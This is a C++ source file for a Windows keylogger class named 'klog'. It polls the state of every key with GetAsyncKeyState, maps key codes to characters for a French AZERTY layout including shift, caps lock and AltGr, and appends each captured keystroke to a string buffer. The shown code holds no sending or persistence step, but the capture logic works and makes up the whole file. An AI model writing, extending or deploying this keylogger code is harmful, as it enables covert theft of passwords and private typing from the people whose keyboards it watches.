#include <windows.h>
#include <map>
#include <string>
#include <vector>

class klog {
private:
    bool is_pressed(int key)
    {
        return GetAsyncKeyState(key) & 1;
    }

    bool is_cap_pressed()
    {
        short int shift = GetAsyncKeyState(VK_SHIFT);
        short int caps = GetKeyState(VK_CAPITAL);

        bool s = shift < 0;
        bool c = (caps & 1) != 0;

        return s != c;
    }

    bool is_altgr_pressed()
    {
        short int altGr = GetAsyncKeyState(VK_RMENU);

        return altGr < 0;
    }

    bool is_letter(int key) {
        return key >= 65 && key <= 90;
    }

    int to_lowercase(int letter) {
        return letter + 32;
    }

    std::map<int, std::string> specials = {
        {VK_BACK, "[Back]"},
        {VK_TAB, "[Tab]"},
        {VK_RETURN, "[Ret]"},
        {VK_ESCAPE, "[Esc]"},
        {VK_SPACE, " "},
        {VK_LEFT, "[LArr]"},
        {VK_UP, "[UpArr]"},
        {VK_RIGHT, "[RArr]"},
        {VK_DOWN, "[DArr]"},
        {VK_INSERT, "[Ins]"},
        {VK_DELETE, "[Del]"},
        {VK_NUMPAD0, "0"},
        {VK_NUMPAD1, "1"}, {VK_NUMPAD2, "2"}, {VK_NUMPAD3, "3"},
        {VK_NUMPAD4, "4"}, {VK_NUMPAD5, "5"}, {VK_NUMPAD6, "6"},
        {VK_NUMPAD7, "7"}, {VK_NUMPAD8, "8"}, {VK_NUMPAD9, "9"},
        {VK_DIVIDE, "/"}, {VK_MULTIPLY, "*"}, {VK_SUBTRACT, "-"},
        {VK_ADD, "+"}, {VK_DECIMAL, "."}, {222, "²"}
    };

    std::map<int, std::pair<char, char>> specials2 = {
        {49,  std::make_pair('&', '1')},
        {188, std::make_pair(',', '?')},
        {190, std::make_pair(';', '.')},
        {191, std::make_pair(':', '/')},
        {192, std::make_pair('ù', '%')},
        {220, std::make_pair('*', 'µ')},
        {221, std::make_pair('^', '¨')},
        {223, std::make_pair('!', '§')},
        {226, std::make_pair('<', '>')}
    };

    std::map<int, std::tuple<char, char, char>> specials3 = {
        {48,  std::make_tuple('à', '0', '@')},
        {50,  std::make_tuple('é', '2', '~')},
        {51,  std::make_tuple('"', '3', '#')},
        {52,  std::make_tuple('\'', '4', '{')},
        {53,  std::make_tuple('(', '5', '[')},
        {54,  std::make_tuple('-', '6', '|')},
        {55,  std::make_tuple('è', '7', '`')},
        {56,  std::make_tuple('_', '8', '\\')},
        {57,  std::make_tuple('ç', '9', '^')},
        {186, std::make_tuple('$', '£', '¤')},
        {187, std::make_tuple('=', '+', '}')},
        {219, std::make_tuple(')', '°', ']')}
    };

    std::vector<int> ignore = {
        162, 165, 18, 161, 16, 160, 20
    };

public:
    std::string buffer;

    void do_klog()
    {
        std::string to_log;

        for (int k = 8; k <= 255; k++)
        {
            if (is_pressed(k))
            {
                if (!(std::find(ignore.begin(), ignore.end(), k) != ignore.end())) {

                    if (is_letter(k))
                    {
                        if (is_cap_pressed()) {
                            to_log = k;
                        }
                        else {
                            to_log = to_lowercase(k);
                        }
                    }
                    else if (specials.count(k) > 0)
                    {
                        to_log = specials[k];
                    }
                    else if (specials2.count(k) > 0)
                    {
                        if (is_cap_pressed()) {
                            to_log = specials2[k].second;
                        }
                        else {
                            to_log = specials2[k].first;
                        }
                    }
                    else if (specials3.count(k) > 0)
                    {
                        if (is_cap_pressed()) {
                            to_log = std::get<1>(specials3[k]);
                        }
                        else if (is_altgr_pressed()) {
                            to_log = std::get<2>(specials3[k]);
                        }
                        else {
                            to_log = std::get<0>(specials3[k]);
                        }
                    }

                    buffer.append(to_log);
                }
            }
        }
    }

};
